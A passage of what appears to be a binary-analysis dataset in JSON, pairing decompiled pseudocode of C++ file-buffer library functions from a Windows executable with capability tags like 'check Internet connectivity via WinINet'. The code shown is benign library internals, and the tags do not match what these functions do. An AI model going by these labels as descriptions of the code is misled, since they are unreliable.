}\n        if (uStack320 == '\\0') {\n            return uStack320;\n        }\n        do {\n            uVar6 = (**(*arg1[0x14] + 0x18))(arg1[0x14], arg1 + 0xd, auStack200, auStack72);\n            if (uVar6 == 2) {\n                return uVar5;\n            }\n            if ((1 < uVar6) || (iVar14 = iStack208 - auStack200,  iVar14 < 1)) break;\n            iVar7 = fcn.1400820e0(arg1 + 10, auStack200, iVar14);\n            if (iVar14 != iVar7) {\n                return uVar5;\n            }\n        } while ((uVar6 & 1) != 0);\n        iVar4 = (**(*arg1 + 0x68))(arg1, 0xffffffff);\n        return uVar5 & 0xffffff00 | iVar4 != -1;\n    }\n    fcn.1400bd1f0();\n    piStack328 = arg1;\n    puVar13 = auStack432;\n    puVar12 = auStack432;\n    pcVar11 = piVar9[0x14];\n    if (pcVar11 == NULL) goto code_r0x0001400896d5;\n    uStack440 = 0x1400895a4;\n    cVar3 = (**(*pcVar11 + 0x30))();\n    if (cVar3 == '\\0') {\n        uStack440 = 0x1400895b5;\n        iVar4 = (**(*piVar9[0x14] + 0x40))();\n        iVar10 = iVar4 * in_R8;\n        uStack440 = 0x1400895c9;\n        iVar7 = fcn.1400147b0(iVar10);\n        piVar1 = piVar9[0x14];\n        iVar7 = -iVar7;\n        puVar13 = auStack432 + iVar7;\n        puVar12 = auStack432 + iVar7;\n        iVar14 = *piVar1;\n        arg2 = auStack368 + iVar7;\n        *(aiStack400 + iVar7 + 0x18) = &iStack352;\n        *(aiStack400 + iVar7 + 0x10) = arg2 + iVar10;\n        *(aiStack400 + iVar7 + 8) = arg2;\n        *(aiStack400 + iVar7) = auStack344;\n        pcVar2 = *(iVar14 + 0x10);\n        *(auStack432 + iVar7 + -8) = 0x14008960e;\n        uVar5 = (*pcVar2)(piVar1, piVar9 + 0xd, in_RDX);\n        if (uVar5 < 2) {\n            uStack364 = uVar5;\n            iStack360 = iStack352;\n            in_R8 = iStack352 - arg2;\n            *(auStack432 + iVar7 + -8) = 0x14008966b;\n            uVar8 = fcn.1400820e0(piVar9 + 10, arg2, in_R8);\n            iVar14 = iStack360;\n            if ((in_R8 != uVar8) || ((uStack364 & 1) == 0)) goto code_r0x00014008962b;\n            piVar1 = piVar9[0x14];\n            iVar10 = *piVar1;\n            *(aiStack400 + iVar7 + 0x18) = &iStack352;\n            *(aiStack400 + iVar7 + 0x10) = iVar14;\n            *(aiStack400 + iVar7 + 8) = arg2;\n            *(aiStack400 + iVar7) = auStack344;\n            iVar14 = piVar9[5];\n            pcVar2 = *(iVar10 + 0x10);\n            *(auStack432 + iVar7 + -8) = 0x1400896aa;\n            iVar4 = (*pcVar2)(piVar1, piVar9 + 0xd, auStack344[0], iVar14);\n            if (iVar4 != 2) {\n                in_R8 = iStack352 - arg2;\n                *(auStack432 + iVar7 + -8) = 0x1400896c4;\n                uVar8 = fcn.1400820e0(piVar9 + 10, arg2, in_R8);\n                goto code_r0x00014008962b;\n            }\n        }\n        else if (uVar5 == 3) goto code_r0x00014008961c;\n        pcVar11 = \"basic_filebuf::_M_convert_to_external conversion error\";\n        *(auStack432 + iVar7 + -8) = 0x1400896d5;\n        fcn.1400bd8d0(\"basic_filebuf::_M_convert_to_external conversion error\");\ncode_r0x0001400896d5:\n        *(puVar13 + -8) = 0x1400896da;\n        uVar8 = fcn.1400bd1f0();\n        *(puVar13 + -8) = piVar9;\n        if (*(pcVar11 + 0x80) != '\\0') {\n            if (*(pcVar11 + 0x70) != 0) {\n                *(puVar13 + -0x30) = 0x1400896ff;\n                uVar8 = fcn.1400bc6b0();\n            }\n            *(pcVar11 + 0x70) = 0;\n            *(pcVar11 + 0x80) = 0;\n        }\n        if (*(pcVar11 + 0xa8) != 0) {\n            *(puVar13 + -0x30) = 0x14008971f;\n            uVar8 = fcn.1400bc6b0();\n        }\n        *(pcVar11 + 0xa8) = 0;\n        *(pcVar11 + 0xb0) = 0;\n        *(pcVar11 + 0xb8) = 0x0;\n        return uVar8;\n    }\ncode_r0x00014008961c:\n    *(puVar12 + -8) = 0x14008962b;\n    uVar8 = fcn.1400820e0(piVar9 + 10, in_RDX, in_R8);\ncode_r0x00014008962b:\n    return uVar8 & 0xffffffffffffff00 | uVar8 == in_R8;\n}\n",
        "token_count": 1821
    },
    "14008957": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.140089570(int64_t arg1, ulong arg2, uint64_t arg3)\n\n{\n    uchar *arg2_00;\n    int64_t *piVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    ulong uVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    char *pcVar11;\n    uchar *puVar12;\n    uchar *puVar13;\n    uchar auStack176 [4];\n    ulong var_1ch;\n    ulong var_10h;\n    ulong var_8h_2;\n    ulong var_8h;\n    int64_t aiStack128 [3];\n    uchar auStack104 [4];\n    uint32_t uStack100;\n    int64_t iStack96;\n    int64_t iStack88;\n    ulong uStack80;\n    \n    puVar13 = &fcn.140089570::var_1ch + 4;\n    puVar12 = &fcn.140089570::var_1ch + 4;\n    pcVar11 = *(arg1 + 0xa0);\n    if (pcVar11 == NULL) goto code_r0x0001400896d5;\n    _auStack176 = 0x1400895a4;\n    cVar5 = (**(*pcVar11 + 0x30))();\n    if (cVar5 == '\\0') {\n        _auStack176 = 0x1400895b5;\n        iVar6 = (**(**(arg1 + 0xa0) + 0x40))();\n        iVar10 = iVar6 * arg3;\n        _auStack176 = 0x1400895c9;\n        iVar8 = fcn.1400147b0(iVar10);\n        piVar1 = *(arg1 + 0xa0);\n        iVar8 = -iVar8;\n        puVar13 = &fcn.140089570::var_1ch + iVar8 + 4;\n        puVar12 = &fcn.140089570::var_1ch + iVar8 + 4;\n        iVar2 = *piVar1;\n        arg2_00 = &stack0xffffffffffffff98 + iVar8;\n        *(&stack0xffffffffffffff90 + iVar8) = &stack0xffffffffffffffa8;\n        *(&stack0xffffffffffffff88 + iVar8) = arg2_00 + iVar10;\n        *(&stack0xffffffffffffff80 + iVar8) = arg2_00;\n        *(&fcn.140089570::var_8h + iVar8) = &stack0xffffffffffffffb0;\n        pcVar3 = *(iVar2 + 0x10);\n        *(&stack0xffffffffffffff50 + iVar8) = 0x14008960e;\n        uVar7 = (*pcVar3)(piVar1, arg1 + 0x68, arg2);\n        if (uVar7 < 2) {\n            uStack100 = uVar7;\n            iStack96 = iStack88;\n            arg3 = iStack88 - arg2_00;\n            *(&stack0xffffffffffffff50 + iVar8) = 0x14008966b;\n            uVar9 = fcn.1400820e0(arg1 + 0x50, arg2_00, arg3);\n            iVar2 = iStack96;\n            if ((arg3 != uVar9) || ((uStack100 & 1) == 0)) goto code_r0x00014008962b;\n            piVar1 = *(arg1 + 0xa0);\n            iVar10 = *piVar1;\n            *(&stack0xffffffffffffff90 + iVar8) = &stack0xffffffffffffffa8;\n            *(&stack0xffffffffffffff88 + iVar8) = iVar2;\n            *(&stack0xffffffffffffff80 + iVar8) = arg2_00;\n            *(&fcn.140089570::var_8h + iVar8) = &stack0xffffffffffffffb0;\n            uVar4 = *(arg1 + 0x28);\n            pcVar3 = *(iVar10 + 0x10);\n            *(&stack0xffffffffffffff50 + iVar8) = 0x1400896aa;\n            iVar6 = (*pcVar3)(piVar1, arg1 + 0x68, uStack80, uVar4);\n            if (iVar6 != 2) {\n                arg3 = iStack88 - arg2_00;\n                *(&stack0xffffffffffffff50 + iVar8) = 0x1400896c4;\n                uVar9 = fcn.1400820e0(arg1 + 0x50, arg2_00, arg3);\n                goto code_r0x00014008962b;\n            }\n        }\n        else if (uVar7 == 3) goto code_r0x00014008961c;\n        pcVar11 = \"basic_filebuf::_M_convert_to_external conversion error\";\n        *(&stack0xffffffffffffff50 + iVar8) = 0x1400896d5;\n        fcn.1400bd8d0(\"basic_filebuf::_M_convert_to_external conversion error\");\ncode_r0x0001400896d5:\n        *(puVar13 + -8) = 0x1400896da;\n        uVar9 = fcn.1400bd1f0();\n        *(puVar13 + -8) = arg1;\n        if (*(pcVar11 + 0x80) != '\\0') {\n            if (*(pcVar11 + 0x70) != 0) {\n                *(puVar13 + -0x30) = 0x1400896ff;\n                uVar9 = fcn.1400bc6b0();\n            }\n            *(pcVar11 + 0x70) = 0;\n            *(pcVar11 + 0x80) = 0;\n        }\n        if (*(pcVar11 + 0xa8) != 0) {\n            *(puVar13 + -0x30) = 0x14008971f;\n            uVar9 = fcn.1400bc6b0();\n        }\n        *(pcVar11 + 0xa8) = 0;\n        *(pcVar11 + 0xb0) = 0;\n        *(pcVar11 + 0xb8) = 0x0;\n        return uVar9;\n    }\ncode_r0x00014008961c:\n    *(puVar12 + -8) = 0x14008962b;\n    uVar9 = fcn.1400820e0(arg1 + 0x50, arg2, arg3);\ncode_r0x00014008962b:\n    return uVar9 & 0xffffffffffffff00 | uVar9 == arg3;\n}\n",
        "token_count": 1493
    },
    "14008975": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140089750(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    if ((*(arg1 + 0x80) == '\\0') && (*(arg1 + 0x70) == 0)) {\n        uVar1 = fcn.1400bc6e0(*(arg1 + 0x78));\n        *(arg1 + 0x80) = 1;\n        *(arg1 + 0x70) = uVar1;\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "14008979": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140089790(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t *arg1_00;\n    char cVar1;\n    int64_t iVar2;\n    int64_t aiStack56 [3];\n    \n    arg1_00 = arg1 + 10;\n    cVar1 = fcn.140027090(arg1_00);\n    if (cVar1 == '\\0') {\n        fcn.140081ef0(arg1_00, arg2, arg3);\n        cVar1 = fcn.140027090(arg1_00);\n        if (cVar1 != '\\0') {\n            iVar2 = arg1[0xe];\n            if ((*(arg1 + 0x10) == '\\0') && (iVar2 == 0)) {\n                iVar2 = fcn.1400bc6e0(arg1[0xf]);\n                *(arg1 + 0x10) = 1;\n                arg1[0xe] = iVar2;\n            }\n            *(arg1 + 0xc) = arg3;\n            arg1[3] = iVar2;\n            arg1[1] = iVar2;\n            arg1[2] = iVar2;\n            *(arg1 + 4) = 0x0;\n            *(arg1 + 0x81) = 0;\n            arg1[6] = 0;\n            arg1[0xd] = CONCAT44(*(arg1 + 100), *(arg1 + 100));\n            if ((arg3 & 2) == 0) {\n                return arg1;\n            }\n            (**(*arg1 + 0x20))(aiStack56, arg1, 0, 2, arg3);\n            if (aiStack56[0] != -1) {\n                return arg1;\n            }\n            fcn.140089c20(arg1);\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 421
    },
    "1400898a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.1400898a0(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t *arg1_00;\n    char cVar1;\n    int64_t iVar2;\n    int64_t aiStack56 [3];\n    \n    arg1_00 = arg1 + 10;\n    cVar1 = fcn.140027090(arg1_00);\n    if (cVar1 == '\\0') {\n        fcn.140081f40(arg1_00, arg2, arg3);\n        cVar1 = fcn.140027090(arg1_00);\n        if (cVar1 != '\\0') {\n            iVar2 = arg1[0xe];\n            if ((*(arg1 + 0x10) == '\\0') && (iVar2 == 0)) {\n                iVar2 = fcn.1400bc6e0(arg1[0xf]);\n                *(arg1 + 0x10) = 1;\n                arg1[0xe] = iVar2;\n            }\n            *(arg1 + 0xc) = arg3;\n            arg1[3] = iVar2;\n            arg1[1] = iVar2;\n            arg1[2] = iVar2;\n            *(arg1 + 4) = 0x0;\n            *(arg1 + 0x81) = 0;\n            arg1[6] = 0;\n            arg1[0xd] = CONCAT44(*(arg1 + 100), *(arg1 + 100));\n            if ((arg3 & 2) == 0) {\n                return arg1;\n            }\n            (**(*arg1 + 0x20))(aiStack56, arg1, 0, 2, arg3);\n            if (aiStack56[0] != -1) {\n                return arg1;\n            }\n            fcn.140089c20(arg1);\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 423
    },
    "140089c2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.140089c20(int64_t arg1)\n\n{\n    ulong uVar1;\n    char cVar2;\n    int64_t iVar3;\n    \n    cVar2 = fcn.140027090(arg1 + 0x50);\n    if (cVar2 != '\\0') {\n        cVar2 = fcn.140089460(arg1);\n        *(arg1 + 0x60) = 0;\n        *(arg1 + 0x98) = 0;\n        if (*(arg1 + 0x80) != '\\0') {\n            if (*(arg1 + 0x70) != 0) {\n                fcn.1400bc6b0();\n            }\n            *(arg1 + 0x70) = 0;\n            *(arg1 + 0x80) = 0;\n        }\n        if (*(arg1 + 0xa8) != 0) {\n            fcn.1400bc6b0();\n        }\n        uVar1 = *(arg1 + 0x70);\n        *(arg1 + 0xa8) = 0;\n        *(arg1 + 0x18) = uVar1;\n        *(arg1 + 0xb0) = 0;\n        *(arg1 + 0x81) = 0;\n        *(arg1 + 0x30) = 0;\n        *(arg1 + 0xb8) = 0x0;\n        *(arg1 + 0x20) = 0x0;\n        *(arg1 + 8) = uVar1;\n        *(arg1 + 0x10) = uVar1;\n        *(arg1 + 0x68) = CONCAT44(*(arg1 + 100), *(arg1 + 100));\n        iVar3 = fcn.140082010(arg1 + 0x50);\n        if ((iVar3 != 0) && (cVar2 == '\\x01')) {\n            return arg1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 439
    },
    "14008ba3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.14008ba30(int64_t *arg1)\n\n{\n    uchar *arg2;\n    int64_t *piVar1;\n    code *pcVar2;\n    char cVar3;\n    int16_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    int64_t *piVar10;\n    int64_t iVar11;\n    char *pcVar12;\n    ulong in_RDX;\n    uchar *puVar13;\n    uchar *puVar14;\n    uint64_t in_R8;\n    int64_t iVar15;\n    ulong uStack440;\n    uchar auStack432 [32];\n    int64_t aiStack400 [3];\n    int64_t *piStack376;\n    uchar auStack368 [4];\n    uint32_t uStack364;\n    int64_t iStack360;\n    int64_t iStack352;\n    ulong auStack344 [2];\n    int64_t *piStack328;\n    uint64_t uStack320;\n    int64_t iStack208;\n    uchar auStack200 [128];\n    uchar auStack72 [8];\n    \n    uStack320 = 1;\n    if (arg1[4] < arg1[5]) {\n        in_RDX = 0xffff;\n        iVar4 = (**(*arg1 + 0x68))();\n        uStack320 = iVar4 != -1;\n    }\n    if (*(arg1 + 0x82) == '\\0') {\n        return uStack320;\n    }\n    piVar10 = arg1[0x14];\n    if (piVar10 != NULL) {\n        uVar5 = (**(*piVar10 + 0x30))();\n        if (uVar5 != '\\0') {\n            return uStack320;\n        }\n        if (uStack320 == '\\0') {\n            return uStack320;\n        }\n        do {\n            uVar6 = (**(*arg1[0x14] + 0x18))(arg1[0x14], arg1 + 0xd, auStack200, auStack72);\n            if (uVar6 == 2) {\n                return uVar5;\n            }\n            if ((1 < uVar6) || (iVar15 = iStack208 - auStack200,  iVar15 < 1)) break;\n            iVar8 = fcn.1400820e0(arg1 + 10, auStack200, iVar15);\n            if (iVar15 != iVar8) {\n                return uVar5;\n            }\n        } while ((uVar6 & 1) != 0);\n        iVar4 = (**(*arg1 + 0x68))(arg1, 0xffff);\n        return uVar5 & 0xffffff00 | iVar4 != -1;\n    }\n    fcn.1400bd1f0();\n    piStack328 = arg1;\n    puVar14 = auStack432;\n    puVar13 = auStack432;\n    pcVar12 = piVar10[0x14];\n    if (pcVar12 == NULL) goto code_r0x00014008bcb5;\n    uStack440 = 0x14008bb84;\n    cVar3 = (**(*pcVar12 + 0x30))();\n    if (cVar3 == '\\0') {\n        uStack440 = 0x14008bb95;\n        iVar7 = (**(*piVar10[0x14] + 0x40))();\n        iVar11 = iVar7 * in_R8;\n        uStack440 = 0x14008bba9;\n        iVar8 = fcn.1400147b0(iVar11);\n        piVar1 = piVar10[0x14];\n        iVar8 = -iVar8;\n        puVar14 = auStack432 + iVar8;\n        puVar13 = auStack432 + iVar8;\n        iVar15 = *piVar1;\n        arg2 = auStack368 + iVar8;\n        *(aiStack400 + iVar8 + 0x18) = &iStack352;\n        *(aiStack400 + iVar8 + 0x10) = arg2 + iVar11;\n        *(aiStack400 + iVar8 + 8) = arg2;\n        *(aiStack400 + iVar8) = auStack344;\n        pcVar2 = *(iVar15 + 0x10);\n        *(auStack432 + iVar8 + -8) = 0x14008bbee;\n        uVar5 = (*pcVar2)(piVar1, piVar10 + 0xd, in_RDX);\n        if (uVar5 < 2) {\n            uStack364 = uVar5;\n            iStack360 = iStack352;\n            in_R8 = iStack352 - arg2;\n            *(auStack432 + iVar8 + -8) = 0x14008bc4b;\n            uVar9 = fcn.1400820e0(piVar10 + 10, arg2, in_R8);\n            iVar15 = iStack360;\n            if ((in_R8 != uVar9) || ((uStack364 & 1) == 0)) goto code_r0x00014008bc0b;\n            piVar1 = piVar10[0x14];\n            iVar11 = *piVar1;\n            *(aiStack400 + iVar8 + 0x18) = &iStack352;\n            *(aiStack400 + iVar8 + 0x10) = iVar15;\n            *(aiStack400 + iVar8 + 8) = arg2;\n            *(aiStack400 + iVar8) = auStack344;\n            iVar15 = piVar10[5];\n            pcVar2 = *(iVar11 + 0x10);\n            *(auStack432 + iVar8 + -8) = 0x14008bc8a;\n            iVar7 = (*pcVar2)(piVar1, piVar10 + 0xd, auStack344[0], iVar15);\n            if (iVar7 != 2) {\n                in_R8 = iStack352 - arg2;\n                *(auStack432 + iVar8 + -8) = 0x14008bca4;\n                uVar9 = fcn.1400820e0(piVar10 + 10, arg2, in_R8);\n                goto code_r0x00014008bc0b;\n            }\n        }\n        else if (uVar5 == 3) goto code_r0x00014008bbfc;\n        pcVar12 = \"basic_filebuf::_M_convert_to_external conversion error\";\n        *(auStack432 + iVar8 + -8) = 0x14008bcb5;\n        fcn.1400bd8d0(\"basic_filebuf::_M_convert_to_external conversion error\");\ncode_r0x00014008bcb5:\n        *(puVar14 + -8) = 0x14008bcba;\n        uVar9 = fcn.1400bd1f0();\n        *(puVar14 + -8) = piVar10;\n        if (*(pcVar12 + 0x80) != '\\0') {\n            if (*(pcVar12 + 0x70) != 0) {\n                *(puVar14 + -0x30) = 0x14008bcdf;\n                uVar9 = fcn.1400bc6b0();\n            }\n            *(pcVar12 + 0x70) = 0;\n            *(pcVar12 + 0x80) = 0;\n        }\n        if (*(pcVar12 + 0xa8) != 0) {\n            *(puVar14 + -0x30) = 0x14008bcff;\n            uVar9 = fcn.1400bc6b0();\n        }\n        *(pcVar12 + 0xa8) = 0;\n        *(pcVar12 + 0xb0) = 0;\n        *(pcVar12 + 0xb8) = 0x0;\n        return uVar9;\n    }\ncode_r0x00014008bbfc:\n    *(puVar13 + -8) = 0x14008bc0b;\n    uVar9 = fcn.1400820e0(piVar10 + 10, in_RDX, in_R8);\ncode_r0x00014008bc0b:\n    return uVar9 & 0xffffffffffffff00 | uVar9 == in_R8;\n}\n",
        "token_count": 1833
    },
    "14008bb5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.14008bb50(int64_t arg1, ulong arg2, uint64_t arg3)\n\n{\n    uchar *arg2_00;\n    int64_t *piVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    ulong uVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    char *pcVar11;\n    uchar *puVar12;\n    uchar *puVar13;\n    uchar auStack176 [4];\n    ulong var_1ch;\n    ulong var_10h;\n    ulong var_8h_2;\n    ulong var_8h;\n    int64_t aiStack128 [3];\n    uchar auStack104 [4];\n    uint32_t uStack100;\n    int64_t iStack96;\n    int64_t iStack88;\n    ulong uStack80;\n    \n    puVar13 = &fcn.14008bb50::var_1ch + 4;\n    puVar12 = &fcn.14008bb50::var_1ch + 4;\n    pcVar11 = *(arg1 + 0xa0);\n    if (pcVar11 == NULL) goto code_r0x00014008bcb5;\n    _auStack176 = 0x14008bb84;\n    cVar5 = (**(*pcVar11 + 0x30))();\n    if (cVar5 == '\\0') {\n        _auStack176 = 0x14008bb95;\n        iVar6 = (**(**(arg1 + 0xa0) + 0x40))();\n        iVar10 = iVar6 * arg3;\n        _auStack176 = 0x14008bba9;\n        iVar8 = fcn.1400147b0(iVar10);\n        piVar1 = *(arg1 + 0xa0);\n        iVar8 = -iVar8;\n        puVar13 = &fcn.14008bb50::var_1ch + iVar8 + 4;\n        puVar12 = &fcn.14008bb50::var_1ch + iVar8 + 4;\n        iVar2 = *piVar1;\n        arg2_00 = &stack0xffffffffffffff98 + iVar8;\n        *(&stack0xffffffffffffff90 + iVar8) = &stack0xffffffffffffffa8;\n        *(&stack0xffffffffffffff88 + iVar8) = arg2_00 + iVar10;\n        *(&stack0xffffffffffffff80 + iVar8) = arg2_00;\n        *(&fcn.14008bb50::var_8h + iVar8) = &stack0xffffffffffffffb0;\n        pcVar3 = *(iVar2 + 0x10);\n        *(&stack0xffffffffffffff50 + iVar8) = 0x14008bbee;\n        uVar7 = (*pcVar3)(piVar1, arg1 + 0x68, arg2);\n        if (uVar7 < 2) {\n            uStack100 = uVar7;\n            iStack96 = iStack88;\n            arg3 = iStack88 - arg2_00;\n            *(&stack0xffffffffffffff50 + iVar8) = 0x14008bc4b;\n            uVar9 = fcn.1400820e0(arg1 + 0x50, arg2_00, arg3);\n            iVar2 = iStack96;\n            if ((arg3 != uVar9) || ((uStack100 & 1) == 0)) goto code_r0x00014008bc0b;\n            piVar1 = *(arg1 + 0xa0);\n            iVar10 = *piVar1;\n            *(&stack0xffffffffffffff90 + iVar8) = &stack0xffffffffffffffa8;\n            *(&stack0xffffffffffffff88 + iVar8) = iVar2;\n            *(&stack0xffffffffffffff80 + iVar8) = arg2_00;\n            *(&fcn.14008bb50::var_8h + iVar8) = &stack0xffffffffffffffb0;\n            uVar4 = *(arg1 + 0x28);\n            pcVar3 = *(iVar10 + 0x10);\n            *(&stack0xffffffffffffff50 + iVar8) = 0x14008bc8a;\n            iVar6 = (*pcVar3)(piVar1, arg1 + 0x68, uStack80, uVar4);\n            if (iVar6 != 2) {\n                arg3 = iStack88 - arg2_00;\n                *(&stack0xffffffffffffff50 + iVar8) = 0x14008bca4;\n                uVar9 = fcn.1400820e0(arg1 + 0x50, arg2_00, arg3);\n                goto code_r0x00014008bc0b;\n            }\n        }\n        else if (uVar7 == 3) goto code_r0x00014008bbfc;\n        pcVar11 = \"basic_filebuf::_M_convert_to_external conversion error\";\n        *(&stack0xffffffffffffff50 + iVar8) = 0x14008bcb5;\n        fcn.1400bd8d0(\"basic_filebuf::_M_convert_to_external conversion error\");\ncode_r0x00014008bcb5:\n        *(puVar13 + -8) = 0x14008bcba;\n        uVar9 = fcn.1400bd1f0();\n        *(puVar13 + -8) = arg1;\n        if (*(pcVar11 + 0x80) != '\\0') {\n            if (*(pcVar11 + 0x70) != 0) {\n                *(puVar13 + -0x30) = 0x14008bcdf;\n                uVar9 = fcn.1400bc6b0();\n            }\n            *(pcVar11 + 0x70) = 0;\n            *(pcVar11 + 0x80) = 0;\n        }\n        if (*(pcVar11 + 0xa8) != 0) {\n            *(puVar13 + -0x30) = 0x14008bcff;\n            uVar9 = fcn.1400bc6b0();\n        }\n        *(pcVar11 + 0xa8) = 0;\n        *(pcVar11 + 0xb0) = 0;\n        *(pcVar11 + 0xb8) = 0x0;\n        return uVar9;\n    }\ncode_r0x00014008bbfc:\n    *(puVar12 + -8) = 0x14008bc0b;\n    uVar9 = fcn.1400820e0(arg1 + 0x50, arg2, arg3);\ncode_r0x00014008bc0b:\n    return uVar9 & 0xffffffffffffff00 | uVar9 == arg3;\n}\n",
        "token_count": 1504
    },
    "14008bd3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.14008bd30(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    code *pcVar1;\n    char cVar2;\n    int64_t *in_RAX;\n    int64_t *piVar3;\n    int64_t iVar4;\n    ulong *in_RDX;\n    uchar *puVar5;\n    uint64_t unaff_RBP;\n    uint64_t arg3;\n    ulong *unaff_RSI;\n    int64_t *unaff_RDI;\n    uint64_t in_R8;\n    uint64_t uVar6;\n    uchar auStack40 [32];\n    \n    if ((*(arg1 + 0x10) != '\\0') || (arg1[0xe] != 0)) {\n        return in_RAX;\n    }\n    piVar3 = arg1[0xf];\n    if (piVar3 < 0x3ffffffffffffffd) {\n        piVar3 = fcn.1400bc6e0(piVar3 * 2);\n        *(arg1 + 0x10) = 1;\n        arg1[0xe] = piVar3;\n        return piVar3;\n    }\n    fcn.1400bd850();\n    puVar5 = auStack40;\n    while( true ) {\n        *(puVar5 + -8) = unaff_RBP;\n        *(puVar5 + -0x10) = unaff_RDI;\n        *(puVar5 + -0x18) = unaff_RSI;\n        *(puVar5 + -0x20) = arg1;\n        arg1_00 = piVar3 + 10;\n        arg3 = in_R8 & 0xffffffff;\n        *(puVar5 + -0x70) = 0x14008bdad;\n        cVar2 = fcn.140027090(arg1_00);\n        if (cVar2 != '\\0') {\n            return NULL;\n        }\n        *(puVar5 + -0x70) = 0x14008bdc9;\n        unaff_RSI = in_RDX;\n        uVar6 = arg3;\n        fcn.140081ef0(arg1_00, in_RDX, arg3);\n        *(puVar5 + -0x70) = 0x14008bdd1;\n        cVar2 = fcn.140027090(arg1_00);\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        iVar4 = piVar3[0xe];\n        if ((*(piVar3 + 0x10) != '\\0') || (iVar4 != 0)) break;\n        arg1 = piVar3[0xf];\n        if (arg1 < 0x3ffffffffffffffd) {\n            *(puVar5 + -0x70) = 0x14008be93;\n            iVar4 = fcn.1400bc6e0(arg1 * 2);\n            *(piVar3 + 0x10) = 1;\n            piVar3[0xe] = iVar4;\n            break;\n        }\n        *(puVar5 + -0x70) = 0x14008bea8;\n        fcn.1400bd850();\n        *(puVar5 + -0x70) = arg3;\n        *(puVar5 + -0x78) = arg1_00;\n        *(puVar5 + -0x80) = in_RDX;\n        *(puVar5 + -0x88) = piVar3;\n        unaff_RDI = arg1 + 10;\n        unaff_RBP = uVar6 & 0xffffffff;\n        *(puVar5 + -0xd8) = 0x14008becd;\n        cVar2 = fcn.140027090(unaff_RDI);\n        if (cVar2 != '\\0') {\n            return NULL;\n        }\n        *(puVar5 + -0xd8) = 0x14008bee3;\n        in_RDX = unaff_RSI;\n        in_R8 = unaff_RBP;\n        fcn.140081f40(unaff_RDI, unaff_RSI, unaff_RBP);\n        *(puVar5 + -0xd8) = 0x14008beeb;\n        cVar2 = fcn.140027090(unaff_RDI);\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        iVar4 = arg1[0xe];\n        if ((*(arg1 + 0x10) != '\\0') || (iVar4 != 0)) {\ncode_r0x00014008bf09:\n            *(arg1 + 0xc) = unaff_RBP;\n            arg1[3] = iVar4;\n            arg1[1] = iVar4;\n            arg1[2] = iVar4;\n            *(arg1 + 4) = 0x0;\n            *(arg1 + 0x81) = 0;\n            arg1[6] = 0;\n            arg1[0xd] = CONCAT44(*(arg1 + 100), *(arg1 + 100));\n            if ((uVar6 & 2) == 0) {\n                return arg1;\n            }\n            iVar4 = *arg1;\n            *(puVar5 + -0xb0) = unaff_RBP;\n            pcVar1 = *(iVar4 + 0x20);\n            *(puVar5 + -0xd8) = 0x14008bf7b;\n            (*pcVar1)(puVar5 + -0xa0, arg1, 0, 2);\n            if (*(puVar5 + -0xa0) == -1) {\n                *(puVar5 + -0xd8) = 0x14008bf8b;\n                fcn.14008c240(arg1);\n                return NULL;\n            }\n            return 